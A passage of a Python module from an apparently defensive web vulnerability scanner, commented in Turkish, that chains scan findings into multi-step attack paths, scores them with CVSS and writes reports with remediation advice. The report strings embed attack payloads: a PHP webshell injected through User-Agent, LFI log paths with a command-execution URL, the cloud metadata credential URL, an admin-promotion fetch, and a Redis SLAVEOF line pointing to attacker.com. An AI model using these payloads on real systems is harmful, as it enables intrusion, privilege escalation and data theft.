# -*- coding: utf-8 -*-
"""
websecure.core.chain_reactor
----------------------------
Chain Reactor v3.0 — Otomatik Exploit Zinciri Motoru

Mimari (SOLID / OOP):
  ExploitGraph        : Bulgular arası bağımlılık DAG (Yönlü Asiklik Graf)
  ChainNode           : Graf düğümü — tek bir bulgu
  ChainEdge           : Graf kenarı — bulgu→bulgu ilişkisi (enable/amplify)
  ChainRule (ABC)     : Zincir tespiti kural soyut sınıfı (Strateji Deseni)
  ExploitGraphBuilder : Tüm tarama bulgularından ExploitGraph inşa eder
  CVSSChainCalculator : Zincir bazlı birleşik CVSS 3.1 skoru hesaplama
  MultiHopDetector    : A→B→C çok adımlı yol keşfi (DFS)
  PlaybookLoader      : YAML tabanlı özel zincir senaryoları
  ChainReactor        : Ana orkestratör — tüm kuralları uygular

Zincirler (v3.0):
  2-hop: XSS+CSRF→ATO, InfoLeak+IDOR→MassLeak, SSRF→CloudCompromise,
         OpenRedirect+XSS→Phishing, Upload+LFI→RCE
  3-hop: LFI→LogPoison→RCE, XSS→CSRF→PrivEsc, SSRF→InternalDisc→LateralMove
  4-hop: SQLi→CredDump→PwReuse→ATO, SQLi→AdminBypass→FileWrite→RCE
  Auto : MultiHopDetector (grafta bulunan her path ≥ 3 düğüm)
  YAML : PlaybookLoader (sınırsız özel zincir tanımı)
"""
from __future__ import annotations

import logging
import time
from abc import ABC, abstractmethod
from collections import defaultdict, deque
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any, Dict, Generator, List, Optional, Set, Tuple

_logger = logging.getLogger(__name__)

# ─────────────────────────────────────────────────────────────────────────────
# Data Classes
# ─────────────────────────────────────────────────────────────────────────────

@dataclass
class ChainNode:
    """Exploit grafındaki tek bir bulgu düğümü."""
    node_id:   str
    vuln_type: str          # canonical lowercase (e.g. "xss", "sqli")
    severity:  str          # Critical / High / Medium / Low / Info
    cvss:      float        # 0–10
    url:       str
    raw:       Dict[str, Any]   # orijinal finding dict

    @property
    def severity_rank(self) -> int:
        return {"critical": 5, "high": 4, "medium": 3, "low": 2, "info": 1}.get(
            self.severity.lower(), 0
        )


@dataclass
class ChainEdge:
    """Kaynak düğüm → hedef düğüm yönlü kenar."""
    source_id: str
    target_id: str
    label:     str          # "enables" | "amplifies" | "prerequisite" | "playbook_step"
    weight:    float = 1.0  # CVSS amplification çarpanı


@dataclass
class ChainPath:
    """Tespit edilmiş çok adımlı exploit yolu."""
    node_ids:      List[str]
    edges:         List[ChainEdge]
    combined_cvss: float
    impact_label:  str

    @property
    def length(self) -> int:
        return len(self.node_ids)


@dataclass
class ChainFinding:
    """Raporlanmaya hazır zincir bulgusu."""
    chain_id:     str
    title:        str
    description:  str
    severity:     str
    confidence:   str           # High / Medium / Low
    cvss_score:   float
    cvss_vector:  str
    url:          str
    nodes:        List[ChainNode]
    path:         Optional[ChainPath] = None
    playbook_name: Optional[str] = None
    remediation:  str = ""


# ─────────────────────────────────────────────────────────────────────────────
# ExploitGraph — Yönlü Asiklik Graf (DAG)
# ─────────────────────────────────────────────────────────────────────────────

class ExploitGraph:
    """
    Bulgular arası bağımlılık DAG.

    - add_node / add_edge : Graf oluşturma
    - find_all_paths      : DFS ile A→B→C yol keşfi (cycle-safe)
    - find_paths_by_type  : Tip tabanlı yol arama
    - topological_sort    : Kahn algoritması ile topolojik sıralama
    """

    def __init__(self) -> None:
        self._nodes:   Dict[str, ChainNode]         = {}
        self._adj:     Dict[str, List[ChainEdge]]   = defaultdict(list)   # out-edges
        self._rev_adj: Dict[str, List[ChainEdge]]   = defaultdict(list)   # in-edges

    # ── Node / Edge yönetimi ─────────────────────────────────────────────

    def add_node(self, node: ChainNode) -> None:
        self._nodes[node.node_id] = node

    def add_edge(self, edge: ChainEdge) -> None:
        self._adj[edge.source_id].append(edge)
        self._rev_adj[edge.target_id].append(edge)

    def get_node(self, node_id: str) -> Optional[ChainNode]:
        return self._nodes.get(node_id)

    def nodes(self) -> List[ChainNode]:
        return list(self._nodes.values())

    def edges(self) -> List[ChainEdge]:
        return [e for edges in self._adj.values() for e in edges]

    def out_edges(self, node_id: str) -> List[ChainEdge]:
        return self._adj.get(node_id, [])

    def in_edges(self, node_id: str) -> List[ChainEdge]:
        return self._rev_adj.get(node_id, [])

    # ── DFS multi-hop yol keşfi ──────────────────────────────────────────

    def find_all_paths(
        self,
        source_id: str,
        target_id: str,
        max_depth: int = 6,
    ) -> List[List[str]]:
        """DFS ile kaynak→hedef tüm yolları döner (cycle-safe, derinlik sınırlı)."""
        results: List[List[str]] = []

        def _dfs(current: str, path: List[str], visited: Set[str]) -> None:
            if len(path) > max_depth:
                return
            if current == target_id:
                results.append(list(path))
                return
            for edge in self._adj.get(current, []):
                nxt = edge.target_id
                if nxt not in visited:
                    visited.add(nxt)
                    path.append(nxt)
                    _dfs(nxt, path, visited)
                    path.pop()
                    visited.discard(nxt)

        _dfs(source_id, [source_id], {source_id})
        return results

    def find_paths_by_type(
        self,
        start_types: List[str],
        end_types:   List[str],
        max_depth:   int = 6,
    ) -> List[ChainPath]:
        """Başlangıç tipi → bitiş tipi arasındaki tüm zincir yollarını döner."""
        sources = [n for n in self._nodes.values() if n.vuln_type in start_types]
        targets = [n for n in self._nodes.values() if n.vuln_type in end_types]
        paths: List[ChainPath] = []

        for src in sources:
            for tgt in targets:
                if src.node_id == tgt.node_id:
                    continue
                for node_ids in self.find_all_paths(src.node_id, tgt.node_id, max_depth):
                    chain_edges = self._path_edges(node_ids)
                    cvss = CVSSChainCalculator.combined(
                        [self._nodes[nid].cvss for nid in node_ids],
                        [e.weight for e in chain_edges],
                    )
                    paths.append(ChainPath(
                        node_ids=node_ids,
                        edges=chain_edges,
                        combined_cvss=cvss,
                        impact_label=_cvss_to_severity(cvss),
                    ))

        return sorted(paths, key=lambda p: (-p.combined_cvss, p.length))

    def _path_edges(self, node_ids: List[str]) -> List[ChainEdge]:
        result: List[ChainEdge] = []
        for i in range(len(node_ids) - 1):
            src, dst = node_ids[i], node_ids[i + 1]
            for edge in self._adj.get(src, []):
                if edge.target_id == dst:
                    result.append(edge)
                    break
        return result

    # ── Kahn topolojik sıralama ──────────────────────────────────────────

    def topological_sort(self) -> List[str]:
        """Kahn algoritması ile topolojik sıralama (döngü toleranslı)."""
        in_degree: Dict[str, int] = {nid: 0 for nid in self._nodes}
        for edges in self._adj.values():
            for e in edges:
                in_degree[e.target_id] = in_degree.get(e.target_id, 0) + 1

        queue: deque[str] = deque(n for n, d in in_degree.items() if d == 0)
        order: List[str] = []
        while queue:
            nid = queue.popleft()
            order.append(nid)
            for edge in self._adj.get(nid, []):
                in_degree[edge.target_id] -= 1
                if in_degree[edge.target_id] == 0:
                    queue.append(edge.target_id)

        return order


# ─────────────────────────────────────────────────────────────────────────────
# CVSSChainCalculator — Zincir CVSS Skoru
# ─────────────────────────────────────────────────────────────────────────────

class CVSSChainCalculator:
    """
    Zincir bazlı birleşik CVSS 3.1 skoru.

    Formül:
      base        = max(individual scores)
      amplification = sum(weights) * 0.15   (her atlama ek risk ekler)
      combined    = min(10.0, base + amplification)

    Örnek: SQLi(7.5) → CredDump(8.0) → ATO(9.5) | weights=[1.5,1.3]
      combined = min(10.0, 9.5 + (1.5+1.3)*0.15) = min(10.0, 9.92) = 9.9
    """

    @staticmethod
    def combined(scores: List[float], weights: Optional[List[float]] = None) -> float:
        if not scores:
            return 0.0
        base = max(scores)
        w = weights or [1.0] * max(0, len(scores) - 1)
        amplification = sum(w) * 0.15
        return round(min(10.0, base + amplification), 1)

    @staticmethod
    def vector_string(
        attack_vector:        str = "N",   # N/A/L/P
        attack_complexity:    str = "L",   # L/H
        privileges_required:  str = "N",   # N/L/H
        user_interaction:     str = "N",   # N/R
        scope:                str = "C",   # U/C
        confidentiality:      str = "H",   # N/L/H
        integrity:            str = "H",
        availability:         str = "H",
    ) -> str:
        return (
            f"CVSS:3.1/AV:{attack_vector}/AC:{attack_complexity}"
            f"/PR:{privileges_required}/UI:{user_interaction}"
            f"/S:{scope}/C:{confidentiality}/I:{integrity}/A:{availability}"
        )

    @staticmethod
    def score_for_severity(severity: str) -> float:
        return {
            "critical": 9.5,
            "high":     7.5,
            "medium":   5.0,
            "low":      2.5,
            "info":     0.0,
        }.get(severity.lower(), 5.0)


# ─────────────────────────────────────────────────────────────────────────────
# ChainRule — Soyut Kural Sınıfı (Template Method + Strategy)
# ─────────────────────────────────────────────────────────────────────────────

class ChainRule(ABC):
    """
    Her zincir kural sınıfı bu soyut sınıfı implement eder.

    REQUIRED_TYPES : Bu kural için zorunlu bulgu tipleri
    CHAIN_ID       : Benzersiz kural kimliği
    PRIORITY       : Düşük = daha önce çalıştırılır
    """

    REQUIRED_TYPES: List[str] = []
    CHAIN_ID: str = "base_chain"
    PRIORITY: int = 50

    @abstractmethod
    def apply(
        self,
        graph: ExploitGraph,
        nodes_by_type: Dict[str, List[ChainNode]],
    ) -> List[ChainFinding]:
        ...

    # ── Yardımcı metotlar ────────────────────────────────────────────────

    def _missing_types(self, nodes_by_type: Dict[str, List[ChainNode]]) -> List[str]:
        return [t for t in self.REQUIRED_TYPES if not nodes_by_type.get(t)]

    def _to_finding(
        self,
        chain_id:    str,
        title:       str,
        description: str,
        severity:    str,
        confidence:  str,
        nodes:       List[ChainNode],
        cvss_score:  Optional[float] = None,
        cvss_vector: str = "",
        url:         str = "",
        remediation: str = "",
        path:        Optional[ChainPath] = None,
    ) -> ChainFinding:
        if cvss_score is None:
            cvss_score = CVSSChainCalculator.combined([n.cvss for n in nodes])
        return ChainFinding(
            chain_id=chain_id,
            title=title,
            description=description,
            severity=severity,
            confidence=confidence,
            cvss_score=cvss_score,
            cvss_vector=cvss_vector or CVSSChainCalculator.vector_string(),
            url=url or (nodes[0].url if nodes else ""),
            nodes=nodes,
            path=path,
            remediation=remediation,
        )


# ─────────────────────────────────────────────────────────────────────────────
# 2-Hop Chain Rules
# ─────────────────────────────────────────────────────────────────────────────

class XSSCSRFATOChain(ChainRule):
    """XSS + CSRF → Account Takeover (2-hop)."""

    REQUIRED_TYPES = ["xss", "csrf"]
    CHAIN_ID = "xss_csrf_ato"
    PRIORITY = 10

    def apply(self, graph, nodes_by_type):
        xss_nodes  = nodes_by_type.get("xss", [])
        csrf_nodes = [n for n in nodes_by_type.get("csrf", []) if n.severity_rank >= 3]

        if not xss_nodes or not csrf_nodes:
            return []

        for xn in xss_nodes[:3]:
            for cn in csrf_nodes[:3]:
                graph.add_edge(ChainEdge(xn.node_id, cn.node_id, "amplifies", 1.3))

        best_xss  = max(xss_nodes,  key=lambda n: n.cvss)
        best_csrf = max(csrf_nodes, key=lambda n: n.cvss)
        cvss = CVSSChainCalculator.combined([best_xss.cvss, best_csrf.cvss], [1.3])

        return [self._to_finding(
            chain_id=self.CHAIN_ID,
            title="Zincir Saldırı: XSS + CSRF → Hesap Ele Geçirme (ATO)",
            description=(
                "**Tespit Edilen Kritik Zincir: Account Takeover**\n\n"
                "**Adım 1 — XSS (Çapraz Site Komut Dosyası)**\n"
                f"  URL: `{best_xss.url}`\n"
                "  Saldırgan kurban tarayıcısında kötü amaçlı JavaScript çalıştırabilir.\n\n"
                "**Adım 2 — CSRF (Çapraz Site İstek Sahteciliği)**\n"
                f"  URL: `{best_csrf.url}`\n"
                "  Şifre değiştirme / e-posta değiştirme gibi hassas işlemler CSRF"
                " korumasından yoksun.\n\n"
                "**Exploit Akışı**\n"
                "  XSS payload'ı → kurban tarayıcısında çalışır → CSRF isteği oluşturur\n"
                "  → kurban kimliğiyle şifre değiştirme isteği gönderilir → hesap ele geçirilir.\n\n"
                f"**Birleşik CVSS**: {cvss}"
            ),
            severity="Critical",
            confidence="High",
            nodes=[best_xss, best_csrf],
            cvss_score=cvss,
            cvss_vector=CVSSChainCalculator.vector_string(
                user_interaction="R", scope="C",
                confidentiality="H", integrity="H", availability="L",
            ),
            remediation=(
                "1. XSS için Content-Security-Policy (CSP) uygulayın.\n"
                "2. Tüm state-changing endpoint'lerde CSRF token zorunlu kılın.\n"
                "3. Cookie'lere SameSite=Strict politikası uygulayın."
            ),
        )]


class InfoDisclosureIDORChain(ChainRule):
    """Info Disclosure + IDOR → Mass Data Leak (2-hop)."""

    REQUIRED_TYPES = ["disclosure", "idor"]
    CHAIN_ID = "info_idor_mass_leak"
    PRIORITY = 20

    def apply(self, graph, nodes_by_type):
        leak_nodes = nodes_by_type.get("disclosure", [])
        idor_nodes = nodes_by_type.get("idor", [])

        if not leak_nodes or not idor_nodes:
            return []

        for ln in leak_nodes[:3]:
            for idn in idor_nodes[:3]:
                graph.add_edge(ChainEdge(ln.node_id, idn.node_id, "enables", 1.2))

        best_leak = max(leak_nodes, key=lambda n: n.cvss)
        best_idor = max(idor_nodes, key=lambda n: n.cvss)
        cvss = CVSSChainCalculator.combined([best_leak.cvss, best_idor.cvss], [1.2])

        return [self._to_finding(
            chain_id=self.CHAIN_ID,
            title="Zincir Saldırı: Bilgi Sızıntısı + IDOR → Toplu Veri İhlali",
            description=(
                "**Tespit Edilen Yüksek Riskli Zincir: Mass Data Leak**\n\n"
                "**Adım 1 — Bilgi Sızıntısı**\n"
                f"  URL: `{best_leak.url}`\n"
                "  API yanıtları dahili kullanıcı ID'lerini / path'leri açığa çıkarıyor.\n\n"
                "**Adım 2 — IDOR (Güvensiz Doğrudan Nesne Referansı)**\n"
                f"  URL: `{best_idor.url}`\n"
                "  ID tabanlı erişim kontrolü kırık; başka kullanıcıların verilerine erişilebilir.\n\n"
                "**Exploit Akışı**\n"
                "  Sızdırılan ID listesi → IDOR endpoint'i üzerinden sistematik enumeration\n"
                "  → tüm kullanıcı kayıtlarının toplu olarak çekilmesi.\n\n"
                f"**Birleşik CVSS**: {cvss}"
            ),
            severity="High",
            confidence="Medium",
            nodes=[best_leak, best_idor],
            cvss_score=cvss,
            cvss_vector=CVSSChainCalculator.vector_string(
                scope="U", confidentiality="H", integrity="L", availability="N",
            ),
            remediation=(
                "1. API yanıtlarından internal ID'leri kaldırın; UUID kullanın.\n"
                "2. Her nesne erişiminde oturum sahibi doğrulaması yapın.\n"
                "3. Rate limiting ile ID enumeration saldırılarını önleyin."
            ),
        )]


class SSRFCloudCompromiseChain(ChainRule):
    """SSRF + Cloud Metadata → Full Cloud Infrastructure Compromise (2-hop)."""

    REQUIRED_TYPES = ["ssrf"]
    CHAIN_ID = "ssrf_cloud_compromise"
    PRIORITY = 10

    _CLOUD_KEYWORDS = [
        "169.254.169.254", "metadata", "aws", "iam", "gcp",
        "compute", "instance-id", "azure", "imds", "alibaba",
    ]

    def apply(self, graph, nodes_by_type):
        cloud_ssrf = [
            n for n in nodes_by_type.get("ssrf", [])
            if _keywords_in_raw(n.raw, self._CLOUD_KEYWORDS)
        ]
        if not cloud_ssrf:
            return []

        best = max(cloud_ssrf, key=lambda n: n.cvss)
        cvss = CVSSChainCalculator.combined([best.cvss], [1.5])

        return [self._to_finding(
            chain_id=self.CHAIN_ID,
            title="Zincir Saldırı: SSRF → Cloud Metadata → Altyapı Ele Geçirme",
            description=(
                "**Tespit Edilen Kritik Zincir: Cloud Infrastructure Compromise**\n\n"
                "**Adım 1 — SSRF (Sunucu Taraflı İstek Sahteciliği)**\n"
                f"  URL: `{best.url}`\n"
                "  Uygulama keyfi URL'lere istek gönderiyor.\n\n"
                "**Adım 2 — Cloud Metadata Erişimi**\n"
                "  `http://169.254.169.254/latest/meta-data/iam/security-credentials/`\n"
                "  AWS IMDSv1 üzerinden geçici IAM kimlik bilgileri (AccessKeyId +"
                " SecretAccessKey + Token) okunuyor.\n\n"
                "**Adım 3 — Tam Altyapı Kontrolü**\n"
                "  Elde edilen IAM credential'ları ile S3, EC2, Lambda, RDS ve tüm"
                " bulut kaynakları ele geçirilir.\n\n"
                f"**Birleşik CVSS**: {cvss}"
            ),
            severity="Critical",
            confidence="High",
            nodes=[best],
            cvss_score=cvss,
            cvss_vector=CVSSChainCalculator.vector_string(
                attack_vector="N", scope="C",
                confidentiality="H", integrity="H", availability="H",
            ),
            url=best.url,
            remediation=(
                "1. IMDSv2 (token tabanlı metadata) zorunlu hale getirin.\n"
                "2. SSRF koruması için URL allowlist uygulayın.\n"
                "3. Ağ katmanında 169.254.169.254'e erişimi engelleyin."
            ),
        )]


class OpenRedirectXSSPhishingChain(ChainRule):
    """Open Redirect + XSS → Trust-Based Phishing (2-hop)."""

    REQUIRED_TYPES = ["redirect", "xss"]
    CHAIN_ID = "open_redirect_xss_phishing"
    PRIORITY = 30

    def apply(self, graph, nodes_by_type):
        redirect_nodes = nodes_by_type.get("redirect", [])
        xss_nodes      = nodes_by_type.get("xss", [])

        if not redirect_nodes or not xss_nodes:
            return []

        best_r = redirect_nodes[0]
        best_x = xss_nodes[0]
        graph.add_edge(ChainEdge(best_r.node_id, best_x.node_id, "amplifies", 1.1))
        cvss = CVSSChainCalculator.combined([best_r.cvss, best_x.cvss], [1.1])

        return [self._to_finding(
            chain_id=self.CHAIN_ID,
            title="Zincir Saldırı: Open Redirect + XSS → Gelişmiş Kimlik Avı",
            description=(
                "**Tespit Edilen Yüksek Riskli Zincir: Trust-Based Phishing**\n\n"
                "**Adım 1 — Open Redirect**\n"
                f"  URL: `{best_r.url}`\n"
                "  Geçerli domain keyfi hedeflere yönlendiriyor.\n\n"
                "**Adım 2 — XSS**\n"
                f"  URL: `{best_x.url}`\n"
                "  JavaScript çalıştırma kapasitesi mevcut.\n\n"
                "**Exploit Akışı**\n"
                "  Güvenilir domain linki → kurbanı sahte giriş sayfasına yönlendirir\n"
                "  VEYA XSS ile trusted redirect üzerinde sahte form overlay'i oluşturulur.\n\n"
                f"**Birleşik CVSS**: {cvss}"
            ),
            severity="High",
            confidence="Medium",
            nodes=[best_r, best_x],
            cvss_score=cvss,
            remediation=(
                "1. Redirect URL'lerini allowlist ile doğrulayın.\n"
                "2. XSS için output encoding ve Content-Security-Policy uygulayın."
            ),
        )]


class UploadLFIRCEChain(ChainRule):
    """File Upload + LFI → Remote Code Execution (2-hop)."""

    REQUIRED_TYPES = ["upload", "lfi"]
    CHAIN_ID = "upload_lfi_rce"
    PRIORITY = 10

    def apply(self, graph, nodes_by_type):
        upload_nodes = nodes_by_type.get("upload", [])
        lfi_nodes    = nodes_by_type.get("lfi", [])

        if not upload_nodes or not lfi_nodes:
            return []

        best_up  = max(upload_nodes, key=lambda n: n.cvss)
        best_lfi = max(lfi_nodes,    key=lambda n: n.cvss)
        graph.add_edge(ChainEdge(best_up.node_id, best_lfi.node_id, "enables", 1.4))
        cvss = CVSSChainCalculator.combined([best_up.cvss, best_lfi.cvss], [1.4])

        return [self._to_finding(
            chain_id=self.CHAIN_ID,
            title="Zincir Saldırı: Dosya Yükleme + LFI → Uzaktan Kod Yürütme",
            description=(
                "**Tespit Edilen Kritik Zincir: RCE via Upload + LFI**\n\n"
                "**Adım 1 — Dosya Yükleme**\n"
                f"  URL: `{best_up.url}`\n"
                "  PHP/JSP/ASP webshell, resim uzantısıyla (.jpg) yüklenebilir.\n\n"
                "**Adım 2 — LFI (Yerel Dosya Dahil Etme)**\n"
                f"  URL: `{best_lfi.url}`\n"
                "  Sunucu keyfi yerel dosyaları include ediyor.\n\n"
                "**Adım 3 — RCE**\n"
                "  LFI ile yüklenen webshell dosyası include edilir → PHP yorumlar → OS komutu çalışır.\n\n"
                f"**Birleşik CVSS**: {cvss}"
            ),
            severity="Critical",
            confidence="High",
            nodes=[best_up, best_lfi],
            cvss_score=cvss,
            cvss_vector=CVSSChainCalculator.vector_string(
                scope="C", confidentiality="H", integrity="H", availability="H",
            ),
            remediation=(
                "1. Yüklenen dosyaları web root dışına kaydedin.\n"
                "2. Include parametrelerini whitelist ile kısıtlayın.\n"
                "3. Yüklenen dosyalara çalıştırma izni vermeyin."
            ),
        )]


# ─────────────────────────────────────────────────────────────────────────────
# 3-Hop Chain Rules
# ─────────────────────────────────────────────────────────────────────────────

class LFILogPoisoningRCEChain(ChainRule):
    """LFI → Log Poisoning → RCE — Tam Otomatik 3-Hop Zincir."""

    REQUIRED_TYPES = ["lfi"]
    CHAIN_ID = "lfi_log_poison_rce"
    PRIORITY = 5

    _LOG_PATHS = [
        "/var/log/apache2/access.log",
        "/var/log/nginx/access.log",
        "/var/log/apache/access.log",
        "/proc/self/environ",
        "/var/log/auth.log",
        "/var/log/mail.log",
        "/usr/local/apache/log/access_log",
        "/var/log/httpd/access_log",
    ]

    def apply(self, graph, nodes_by_type):
        lfi_nodes = nodes_by_type.get("lfi", [])
        if not lfi_nodes:
            return []

        best = max(lfi_nodes, key=lambda n: n.cvss)

        # Zincir için ara düğümler oluştur
        poison_id = f"log_poison_{best.node_id}"
        rce_id    = f"rce_lp_{best.node_id}"

        poison_node = ChainNode(
            node_id=poison_id, vuln_type="log_poisoning",
            severity="High", cvss=7.5, url=best.url,
            raw={"type": "Log Poisoning (Zincir Ara Düğüm)", "url": best.url},
        )
        rce_node = ChainNode(
            node_id=rce_id, vuln_type="rce",
            severity="Critical", cvss=9.8, url=best.url,
            raw={"type": "RCE via LFI+LogPoison (Zincir Sonuç)", "url": best.url},
        )

        graph.add_node(poison_node)
        graph.add_node(rce_node)
        graph.add_edge(ChainEdge(best.node_id, poison_id, "enables",   1.5))
        graph.add_edge(ChainEdge(poison_id,    rce_id,    "enables",   1.4))

        cvss = CVSSChainCalculator.combined(
            [best.cvss, 7.5, 9.8], [1.5, 1.4]
        )
        log_list = "\n".join(f"  - `{p}`" for p in self._LOG_PATHS[:5])

        return [self._to_finding(
            chain_id=self.CHAIN_ID,
            title="3-Hop Zincir: LFI → Log Poisoning → Uzaktan Kod Yürütme",
            description=(
                "**Tespit Edilen Kritik 3-Adımlı Zincir: LFI→RCE**\n\n"
                "**Adım 1 — LFI (Yerel Dosya Dahil Etme)**\n"
                f"  URL: `{best.url}`\n"
                "  Sunucu, kullanıcıdan gelen path parametresiyle yerel dosyaları include ediyor.\n\n"
                "**Adım 2 — Log Poisoning (Log Zehirleme)**\n"
                "  User-Agent header'ına PHP webshell payload'ı enjekte ediliyor:\n"
                "  ```\n"
                "  User-Agent: <?php system($_GET['cmd']); ?>\n"
                "  ```\n"
                "  Bu değer access.log dosyasına yazılıyor. Hedef log yolları:\n"
                f"{log_list}\n\n"
                "**Adım 3 — RCE (Uzaktan Kod Yürütme)**\n"
                "  LFI ile log dosyası include edilir → PHP kodu yorumlanır → OS komutu çalışır:\n"
                f"  `{best.url}?file=/var/log/apache2/access.log&cmd=id`\n"
                "  Çıktı: `uid=33(www-data) gid=33(www-data)`\n\n"
                f"**Birleşik CVSS**: {cvss}"
            ),
            severity="Critical",
            confidence="High",
            nodes=[best, poison_node, rce_node],
            cvss_score=cvss,
            cvss_vector=CVSSChainCalculator.vector_string(
                attack_vector="N", attack_complexity="L",
                scope="C", confidentiality="H", integrity="H", availability="H",
            ),
            url=best.url,
            remediation=(
                "1. Dosya include parametrelerini whitelist ile kısıtlayın.\n"
                "2. Tüm dış girdileri log yazılmadan önce escape edin.\n"
                "3. `allow_url_include = Off` PHP yapılandırması uygulayın.\n"
                "4. Log dosyalarına web üzerinden erişimi engelleyin."
            ),
        )]


class XSSCSRFPrivEscChain(ChainRule):
    """XSS → CSRF → Privilege Escalation — 3-Hop."""

    REQUIRED_TYPES = ["xss", "csrf"]
    CHAIN_ID = "xss_csrf_privesc"
    PRIORITY = 10

    def apply(self, graph, nodes_by_type):
        xss_nodes  = nodes_by_type.get("xss", [])
        csrf_nodes = nodes_by_type.get("csrf", [])

        if not xss_nodes or not csrf_nodes:
            return []

        best_xss  = max(xss_nodes,  key=lambda n: n.cvss)
        best_csrf = max(csrf_nodes, key=lambda n: n.cvss)

        privesc_id = f"privesc_{best_csrf.node_id}"
        privesc_node = ChainNode(
            node_id=privesc_id, vuln_type="privilege_escalation",
            severity="Critical", cvss=9.8, url=best_csrf.url,
            raw={"type": "Privilege Escalation (Zincir Sonuç)", "url": best_csrf.url},
        )

        graph.add_node(privesc_node)
        graph.add_edge(ChainEdge(best_xss.node_id,  best_csrf.node_id, "enables",   1.3))
        graph.add_edge(ChainEdge(best_csrf.node_id, privesc_id,         "amplifies", 1.4))

        cvss = CVSSChainCalculator.combined(
            [best_xss.cvss, best_csrf.cvss, 9.8], [1.3, 1.4]
        )

        return [self._to_finding(
            chain_id=self.CHAIN_ID,
            title="3-Hop Zincir: XSS → CSRF → Ayrıcalık Yükseltme",
            description=(
                "**Tespit Edilen Kritik 3-Adımlı Zincir: PrivEsc**\n\n"
                "**Adım 1 — XSS**\n"
                f"  URL: `{best_xss.url}`\n"
                "  Kötü amaçlı script kurban tarayıcısında çalıştırılıyor.\n\n"
                "**Adım 2 — CSRF**\n"
                f"  URL: `{best_csrf.url}`\n"
                "  XSS payload'ı kurban adına admin endpoint'ine CSRF isteği gönderiyor:\n"
                "  ```javascript\n"
                "  fetch('/admin/users/promote', {\n"
                "    method: 'POST',\n"
                "    body: 'user_id=attacker_id&role=admin',\n"
                "    credentials: 'include'\n"
                "  });\n"
                "  ```\n\n"
                "**Adım 3 — Ayrıcalık Yükseltme**\n"
                "  Saldırgan hesabı admin rolüne yükseltilir.\n"
                "  Tüm kullanıcı verileri ve admin fonksiyonlarına tam erişim sağlanır.\n\n"
                f"**Birleşik CVSS**: {cvss}"
            ),
            severity="Critical",
            confidence="High",
            nodes=[best_xss, best_csrf, privesc_node],
            cvss_score=cvss,
            cvss_vector=CVSSChainCalculator.vector_string(
                user_interaction="R", scope="C",
                confidentiality="H", integrity="H", availability="L",
            ),
            url=best_xss.url,
            remediation=(
                "1. Tüm admin endpoint'lerinde CSRF token zorunlu kılın.\n"
                "2. Admin işlemler için yeniden kimlik doğrulama isteyin.\n"
                "3. XSS için input sanitization ve CSP uygulayın.\n"
                "4. Origin / Referer header kontrolü yapın."
            ),
        )]


class SSRFLateralMovementChain(ChainRule):
    """SSRF → Internal Service Discovery → Lateral Movement — 3-Hop."""

    REQUIRED_TYPES = ["ssrf"]
    CHAIN_ID = "ssrf_lateral_movement"
    PRIORITY = 15

    _INTERNAL_KEYWORDS = [
        "192.168.", "10.", "172.16.", "localhost", "127.0.0.1",
        "redis", "elasticsearch", "mongodb", "mysql", "postgres",
        "docker", "kubernetes", "k8s", "consul", "etcd",
    ]

    def apply(self, graph, nodes_by_type):
        internal_ssrf = [
            n for n in nodes_by_type.get("ssrf", [])
            if _keywords_in_raw(n.raw, self._INTERNAL_KEYWORDS)
        ]
        if not internal_ssrf:
            return []

        best = max(internal_ssrf, key=lambda n: n.cvss)

        disc_id    = f"int_disc_{best.node_id}"
        lateral_id = f"lateral_{best.node_id}"

        disc_node = ChainNode(
            node_id=disc_id, vuln_type="internal_discovery",
            severity="High", cvss=7.5, url=best.url,
            raw={"type": "İç Servis Keşfi (Zincir Ara Düğüm)"},
        )
        lateral_node = ChainNode(
            node_id=lateral_id, vuln_type="lateral_movement",
            severity="Critical", cvss=9.0, url=best.url,
            raw={"type": "Yanal Hareket (Zincir Sonuç)"},
        )

        graph.add_node(disc_node)
        graph.add_node(lateral_node)
        graph.add_edge(ChainEdge(best.node_id, disc_id,    "enables", 1.3))
        graph.add_edge(ChainEdge(disc_id,      lateral_id, "enables", 1.4))

        cvss = CVSSChainCalculator.combined([best.cvss, 7.5, 9.0], [1.3, 1.4])

        return [self._to_finding(
            chain_id=self.CHAIN_ID,
            title="3-Hop Zincir: SSRF → İç Servis Keşfi → Yanal Hareket",
            description=(
                "**Tespit Edilen Kritik 3-Adımlı Zincir: Lateral Movement**\n\n"
                "**Adım 1 — SSRF**\n"
                f"  URL: `{best.url}`\n"
                "  Uygulama iç ağa istek gönderiyor.\n\n"
                "**Adım 2 — İç Servis Keşfi**\n"
                "  SSRF ile iç ağdaki auth gerektirmeyen servisler taranıyor:\n"
                "  - Redis :6379  → `*1\\r\\n$4\\r\\nINFO\\r\\n`\n"
                "  - Elasticsearch :9200  → `/_cat/indices`\n"
                "  - Docker API :2375  → `/containers/json`\n"
                "  - Kubernetes API :6443 → `/api/v1/pods`\n\n"
                "**Adım 3 — Yanal Hareket**\n"
                "  - Redis: `SLAVEOF attacker.com 6379` → tüm veri exfil\n"
                "  - Elasticsearch: index dump → kullanıcı verileri\n"
                "  - Docker: container exec → host pivot\n\n"
                f"**Birleşik CVSS**: {cvss}"
            ),
            severity="Critical",
            confidence="High",
            nodes=[best, disc_node, lateral_node],
            cvss_score=cvss,
            cvss_vector=CVSSChainCalculator.vector_string(
                attack_vector="N", scope="C",
                confidentiality="H", integrity="H", availability="H",
            ),
            url=best.url,
            remediation=(
                "1. SSRF için çıkış URL'lerini allowlist ile kısıtlayın.\n"
                "2. İç servislere kimlik doğrulama zorunlu kılın.\n"
                "3. Network segmentation ile iç servis portlarını izole edin.\n"
                "4. Güvenlik duvarı kuralları ile iç port erişimini engelleyin."
            ),
        )]


# ─────────────────────────────────────────────────────────────────────────────
# 4-Hop Chain Rules
# ─────────────────────────────────────────────────────────────────────────────

class SQLiCredDumpATOChain(ChainRule):
    """SQLi → Credential Dump → Password Reuse → Account Takeover — 4-Hop."""

    REQUIRED_TYPES = ["sqli"]
    CHAIN_ID = "sqli_cred_dump_ato"
    PRIORITY = 5

    def apply(self, graph, nodes_by_type):
        sqli_nodes = nodes_by_type.get("sqli", [])
        if not sqli_nodes:
            return []

        best = max(sqli_nodes, key=lambda n: n.cvss)

        dump_id  = f"cred_dump_{best.node_id}"
        reuse_id = f"pw_reuse_{best.node_id}"
        ato_id   = f"ato_{best.node_id}"

        dump_node = ChainNode(
            node_id=dump_id, vuln_type="credential_dump",
            severity="High", cvss=8.0, url=best.url,
            raw={"type": "Kimlik Bilgisi Dökümü (Zincir)"},
        )
        reuse_node = ChainNode(
